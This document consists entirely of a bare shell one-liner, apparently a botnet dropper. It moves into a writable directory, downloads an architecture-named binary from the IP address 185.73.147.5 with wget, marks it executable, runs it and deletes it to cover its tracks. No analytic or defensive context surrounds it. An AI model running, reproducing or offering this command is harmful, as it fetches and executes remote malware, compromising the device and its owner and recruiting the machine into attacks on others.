cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.73.147.5/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
